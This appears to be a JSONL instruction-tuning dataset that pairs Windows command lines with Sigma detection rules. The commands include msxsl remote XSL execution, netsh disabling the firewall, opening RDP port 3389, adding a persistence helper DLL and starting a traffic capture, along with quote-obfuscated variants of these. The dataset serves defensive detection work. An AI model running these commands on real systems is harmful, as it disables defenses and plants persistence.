{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\msxsl.exe\\\"", "output": "title: Msxsl.EXE Execution\nid: 9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0\nstatus: test\ndescription: |\n    Detects the execution of the MSXSL utility. This can be used to execute Extensible Stylesheet Language (XSL) files. These files are commonly used to describe the processing and rendering of data within XML files.\n    Adversaries can abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019-10-21\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msxsl.exe'\n    condition: selection\nfalsepositives:\n    - Msxsl is not installed by default and is deprecated, so unlikely on most systems.\n# Note: If you levreage this utility please consider adding additional filters. As this is looking for \"any\" type of execition\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msxsl", "output": "title: Msxsl.EXE Execution\nid: 9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0\nstatus: test\ndescription: |\n    Detects the execution of the MSXSL utility. This can be used to execute Extensible Stylesheet Language (XSL) files. These files are commonly used to describe the processing and rendering of data within XML files.\n    Adversaries can abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019-10-21\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msxsl.exe'\n    condition: selection\nfalsepositives:\n    - Msxsl is not installed by default and is deprecated, so unlikely on most systems.\n# Note: If you levreage this utility please consider adding additional filters. As this is looking for \"any\" type of execition\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msxsl.exe", "output": "title: Msxsl.EXE Execution\nid: 9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0\nstatus: test\ndescription: |\n    Detects the execution of the MSXSL utility. This can be used to execute Extensible Stylesheet Language (XSL) files. These files are commonly used to describe the processing and rendering of data within XML files.\n    Adversaries can abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019-10-21\nmodified: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msxsl.exe'\n    condition: selection\nfalsepositives:\n    - Msxsl is not installed by default and is deprecated, so unlikely on most systems.\n# Note: If you levreage this utility please consider adding additional filters. As this is looking for \"any\" type of execition\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msxsl.exe http", "output": "title: Remote XSL Execution Via Msxsl.EXE\nid: 75d0a94e-6252-448d-a7be-d953dff527bb\nstatus: test\ndescription: Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msxsl.exe'\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Msxsl is not installed by default and is deprecated, so unlikely on most systems.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msxsl.exe ht\\\"tp\\\"", "output": "title: Remote XSL Execution Via Msxsl.EXE\nid: 75d0a94e-6252-448d-a7be-d953dff527bb\nstatus: test\ndescription: Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msxsl.exe'\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Msxsl is not installed by default and is deprecated, so unlikely on most systems.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msxsl http", "output": "title: Remote XSL Execution Via Msxsl.EXE\nid: 75d0a94e-6252-448d-a7be-d953dff527bb\nstatus: test\ndescription: Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msxsl.exe'\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Msxsl is not installed by default and is deprecated, so unlikely on most systems.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\msxsl.exe http", "output": "title: Remote XSL Execution Via Msxsl.EXE\nid: 75d0a94e-6252-448d-a7be-d953dff527bb\nstatus: test\ndescription: Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-11-09\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msxsl.exe'\n        CommandLine|contains: 'http'\n    condition: selection\nfalsepositives:\n    - Msxsl is not installed by default and is deprecated, so unlikely on most systems.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe firewall add tcp 3389 portopening allow", "output": "title: RDP Connection Allowed Via Netsh.EXE\nid: 01aeb693-138d-49d2-9403-c4f52d7d3d62\nstatus: test\ndescription: Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware\nreferences:\n    - https://labs.sentinelone.com/sarwent-malware-updates-command-detonation/\nauthor: Sander Wiebing\ndate: 2020-05-23\nmodified: 2023-12-11\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        # Example:\n        #   Old: netsh firewall add portopening TCP 3389 \"Open Port 3389\"\n        #   New: netsh advfirewall firewall add rule name= \"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n        CommandLine|contains|all:\n            - 'firewall '\n            - 'add '\n            - 'tcp '\n            - '3389'\n        CommandLine|contains:\n            - 'portopening'\n            - 'allow'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe firewall add \\\"tcp\\\" \\\"3389\\\" portopening allow", "output": "title: RDP Connection Allowed Via Netsh.EXE\nid: 01aeb693-138d-49d2-9403-c4f52d7d3d62\nstatus: test\ndescription: Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware\nreferences:\n    - https://labs.sentinelone.com/sarwent-malware-updates-command-detonation/\nauthor: Sander Wiebing\ndate: 2020-05-23\nmodified: 2023-12-11\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        # Example:\n        #   Old: netsh firewall add portopening TCP 3389 \"Open Port 3389\"\n        #   New: netsh advfirewall firewall add rule name= \"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n        CommandLine|contains|all:\n            - 'firewall '\n            - 'add '\n            - 'tcp '\n            - '3389'\n        CommandLine|contains:\n            - 'portopening'\n            - 'allow'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh netsh firewall add tcp 3389 portopening allow", "output": "title: RDP Connection Allowed Via Netsh.EXE\nid: 01aeb693-138d-49d2-9403-c4f52d7d3d62\nstatus: test\ndescription: Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware\nreferences:\n    - https://labs.sentinelone.com/sarwent-malware-updates-command-detonation/\nauthor: Sander Wiebing\ndate: 2020-05-23\nmodified: 2023-12-11\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        # Example:\n        #   Old: netsh firewall add portopening TCP 3389 \"Open Port 3389\"\n        #   New: netsh advfirewall firewall add rule name= \"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n        CommandLine|contains|all:\n            - 'firewall '\n            - 'add '\n            - 'tcp '\n            - '3389'\n        CommandLine|contains:\n            - 'portopening'\n            - 'allow'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe firewall add tcp 3389 portopening allow", "output": "title: RDP Connection Allowed Via Netsh.EXE\nid: 01aeb693-138d-49d2-9403-c4f52d7d3d62\nstatus: test\ndescription: Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware\nreferences:\n    - https://labs.sentinelone.com/sarwent-malware-updates-command-detonation/\nauthor: Sander Wiebing\ndate: 2020-05-23\nmodified: 2023-12-11\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        # Example:\n        #   Old: netsh firewall add portopening TCP 3389 \"Open Port 3389\"\n        #   New: netsh advfirewall firewall add rule name= \"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n        CommandLine|contains|all:\n            - 'firewall '\n            - 'add '\n            - 'tcp '\n            - '3389'\n        CommandLine|contains:\n            - 'portopening'\n            - 'allow'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe firewall set opmode disable advfirewall set state off", "output": "title: Firewall Disabled via Netsh.EXE\nid: 57c4bf16-227f-4394-8ec7-1b745ee061c3\nstatus: test\ndescription: Detects netsh commands that turns off the Windows firewall\nreferences:\n    - https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/\n    - https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-1---disable-microsoft-defender-firewall\nauthor: Fatih Sirin\ndate: 2019-11-01\nmodified: 2023-02-13\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\n    - attack.s0108\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli_1:\n        # Example: netsh firewall set opmode disable\n        CommandLine|contains|all:\n            - 'firewall'\n            - 'set'\n            - 'opmode'\n            - 'disable'\n    selection_cli_2:\n        # Example: netsh advfirewall set currentprofile state off\n        CommandLine|contains|all:\n            - 'advfirewall'\n            - 'set'\n            - 'state'\n            - 'off'\n    condition: selection_img and 1 of selection_cli_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe \\\"nets\\\"h.exe firewall set opmode disable advfirewall set state off", "output": "title: Firewall Disabled via Netsh.EXE\nid: 57c4bf16-227f-4394-8ec7-1b745ee061c3\nstatus: test\ndescription: Detects netsh commands that turns off the Windows firewall\nreferences:\n    - https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/\n    - https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-1---disable-microsoft-defender-firewall\nauthor: Fatih Sirin\ndate: 2019-11-01\nmodified: 2023-02-13\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\n    - attack.s0108\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli_1:\n        # Example: netsh firewall set opmode disable\n        CommandLine|contains|all:\n            - 'firewall'\n            - 'set'\n            - 'opmode'\n            - 'disable'\n    selection_cli_2:\n        # Example: netsh advfirewall set currentprofile state off\n        CommandLine|contains|all:\n            - 'advfirewall'\n            - 'set'\n            - 'state'\n            - 'off'\n    condition: selection_img and 1 of selection_cli_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh netsh firewall set opmode disable advfirewall set state off", "output": "title: Firewall Disabled via Netsh.EXE\nid: 57c4bf16-227f-4394-8ec7-1b745ee061c3\nstatus: test\ndescription: Detects netsh commands that turns off the Windows firewall\nreferences:\n    - https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/\n    - https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-1---disable-microsoft-defender-firewall\nauthor: Fatih Sirin\ndate: 2019-11-01\nmodified: 2023-02-13\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\n    - attack.s0108\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli_1:\n        # Example: netsh firewall set opmode disable\n        CommandLine|contains|all:\n            - 'firewall'\n            - 'set'\n            - 'opmode'\n            - 'disable'\n    selection_cli_2:\n        # Example: netsh advfirewall set currentprofile state off\n        CommandLine|contains|all:\n            - 'advfirewall'\n            - 'set'\n            - 'state'\n            - 'off'\n    condition: selection_img and 1 of selection_cli_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe firewall set opmode disable advfirewall set state off", "output": "title: Firewall Disabled via Netsh.EXE\nid: 57c4bf16-227f-4394-8ec7-1b745ee061c3\nstatus: test\ndescription: Detects netsh commands that turns off the Windows firewall\nreferences:\n    - https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/\n    - https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-1---disable-microsoft-defender-firewall\nauthor: Fatih Sirin\ndate: 2019-11-01\nmodified: 2023-02-13\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\n    - attack.s0108\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli_1:\n        # Example: netsh firewall set opmode disable\n        CommandLine|contains|all:\n            - 'firewall'\n            - 'set'\n            - 'opmode'\n            - 'disable'\n    selection_cli_2:\n        # Example: netsh advfirewall set currentprofile state off\n        CommandLine|contains|all:\n            - 'advfirewall'\n            - 'set'\n            - 'state'\n            - 'off'\n    condition: selection_img and 1 of selection_cli_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe firewall set", "output": "title: Firewall Rule Update Via Netsh.EXE\nid: a70dcb37-3bee-453a-99df-d0c683151be6\nstatus: test\ndescription: Detects execution of netsh with the \"advfirewall\" and the \"set\" option in order to set new values for properties of a existing rule\nreferences:\n    - https://ss64.com/nt/netsh.html\nauthor: X__Junior (Nextron Systems)\ndate: 2023-07-18\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            # Example 1: netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\" \" new enable=Yes\"\n            # Example 2: netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\" \" new enable=Yes\"\n            - ' firewall '\n            - ' set '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\n    - Software installations and removal\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe \"f\"\"i\"\"r\"\"e\"\"w\"\"a\"\"l\"\"l\" set", "output": "title: Firewall Rule Update Via Netsh.EXE\nid: a70dcb37-3bee-453a-99df-d0c683151be6\nstatus: test\ndescription: Detects execution of netsh with the \"advfirewall\" and the \"set\" option in order to set new values for properties of a existing rule\nreferences:\n    - https://ss64.com/nt/netsh.html\nauthor: X__Junior (Nextron Systems)\ndate: 2023-07-18\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            # Example 1: netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\" \" new enable=Yes\"\n            # Example 2: netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\" \" new enable=Yes\"\n            - ' firewall '\n            - ' set '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\n    - Software installations and removal\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh netsh firewall set", "output": "title: Firewall Rule Update Via Netsh.EXE\nid: a70dcb37-3bee-453a-99df-d0c683151be6\nstatus: test\ndescription: Detects execution of netsh with the \"advfirewall\" and the \"set\" option in order to set new values for properties of a existing rule\nreferences:\n    - https://ss64.com/nt/netsh.html\nauthor: X__Junior (Nextron Systems)\ndate: 2023-07-18\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            # Example 1: netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\" \" new enable=Yes\"\n            # Example 2: netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\" \" new enable=Yes\"\n            - ' firewall '\n            - ' set '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\n    - Software installations and removal\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe set firewall", "output": "title: Firewall Rule Update Via Netsh.EXE\nid: a70dcb37-3bee-453a-99df-d0c683151be6\nstatus: test\ndescription: Detects execution of netsh with the \"advfirewall\" and the \"set\" option in order to set new values for properties of a existing rule\nreferences:\n    - https://ss64.com/nt/netsh.html\nauthor: X__Junior (Nextron Systems)\ndate: 2023-07-18\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            # Example 1: netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\" \" new enable=Yes\"\n            # Example 2: netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\" \" new enable=Yes\"\n            - ' firewall '\n            - ' set '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\n    - Software installations and removal\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "netsh.exe \\netsh.exe add helper", "output": "title: Potential Persistence Via Netsh Helper DLL\nid: 56321594-9087-49d9-bf10-524fe8479452\nrelated:\n    - id: c90362e0-2df3-4e61-94fe-b37615814cb1\n      type: similar\n    - id: e7b18879-676e-4a0e-ae18-27039185a8e7\n      type: similar\nstatus: test\ndescription: |\n    Detects the execution of netsh with \"add helper\" flag in order to add a custom helper DLL. This technique can be abused to add a malicious helper DLL that can be used as a persistence proxy that gets called when netsh.exe is executed.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md\n    - https://github.com/outflanknl/NetshHelperBeacon\n    - https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/\nauthor: Victor Sergeev, oscd.community\ndate: 2019-10-25\nmodified: 2023-11-28\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.007\n    - attack.s0108\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'netsh.exe'\n        - Image|endswith: '\\netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'add'\n            - 'helper'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "netsh.exe \\\"\\nets\\\"h.exe add helper", "output": "title: Potential Persistence Via Netsh Helper DLL\nid: 56321594-9087-49d9-bf10-524fe8479452\nrelated:\n    - id: c90362e0-2df3-4e61-94fe-b37615814cb1\n      type: similar\n    - id: e7b18879-676e-4a0e-ae18-27039185a8e7\n      type: similar\nstatus: test\ndescription: |\n    Detects the execution of netsh with \"add helper\" flag in order to add a custom helper DLL. This technique can be abused to add a malicious helper DLL that can be used as a persistence proxy that gets called when netsh.exe is executed.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md\n    - https://github.com/outflanknl/NetshHelperBeacon\n    - https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/\nauthor: Victor Sergeev, oscd.community\ndate: 2019-10-25\nmodified: 2023-11-28\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.007\n    - attack.s0108\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'netsh.exe'\n        - Image|endswith: '\\netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'add'\n            - 'helper'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "netsh \\netsh add helper", "output": "title: Potential Persistence Via Netsh Helper DLL\nid: 56321594-9087-49d9-bf10-524fe8479452\nrelated:\n    - id: c90362e0-2df3-4e61-94fe-b37615814cb1\n      type: similar\n    - id: e7b18879-676e-4a0e-ae18-27039185a8e7\n      type: similar\nstatus: test\ndescription: |\n    Detects the execution of netsh with \"add helper\" flag in order to add a custom helper DLL. This technique can be abused to add a malicious helper DLL that can be used as a persistence proxy that gets called when netsh.exe is executed.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md\n    - https://github.com/outflanknl/NetshHelperBeacon\n    - https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/\nauthor: Victor Sergeev, oscd.community\ndate: 2019-10-25\nmodified: 2023-11-28\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.007\n    - attack.s0108\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'netsh.exe'\n        - Image|endswith: '\\netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'add'\n            - 'helper'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "netsh.exe \\netsh.exe add helper", "output": "title: Potential Persistence Via Netsh Helper DLL\nid: 56321594-9087-49d9-bf10-524fe8479452\nrelated:\n    - id: c90362e0-2df3-4e61-94fe-b37615814cb1\n      type: similar\n    - id: e7b18879-676e-4a0e-ae18-27039185a8e7\n      type: similar\nstatus: test\ndescription: |\n    Detects the execution of netsh with \"add helper\" flag in order to add a custom helper DLL. This technique can be abused to add a malicious helper DLL that can be used as a persistence proxy that gets called when netsh.exe is executed.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md\n    - https://github.com/outflanknl/NetshHelperBeacon\n    - https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/\nauthor: Victor Sergeev, oscd.community\ndate: 2019-10-25\nmodified: 2023-11-28\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.007\n    - attack.s0108\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'netsh.exe'\n        - Image|endswith: '\\netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'add'\n            - 'helper'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe trace start", "output": "title: New Network Trace Capture Started Via Netsh.EXE\nid: d3c3861d-c504-4c77-ba55-224ba82d0118\nstatus: test\ndescription: Detects the execution of netsh with the \"trace\" flag in order to start a network capture\nreferences:\n    - https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/\n    - https://klausjochem.me/2016/02/03/netsh-the-cyber-attackers-tool-of-choice/\nauthor: Kutepov Anton, oscd.community\ndate: 2019-10-24\nmodified: 2023-02-13\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'trace'\n            - 'start'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe netsh.exe trace \\\"st\\\"art", "output": "title: New Network Trace Capture Started Via Netsh.EXE\nid: d3c3861d-c504-4c77-ba55-224ba82d0118\nstatus: test\ndescription: Detects the execution of netsh with the \"trace\" flag in order to start a network capture\nreferences:\n    - https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/\n    - https://klausjochem.me/2016/02/03/netsh-the-cyber-attackers-tool-of-choice/\nauthor: Kutepov Anton, oscd.community\ndate: 2019-10-24\nmodified: 2023-02-13\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'trace'\n            - 'start'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: medium"}
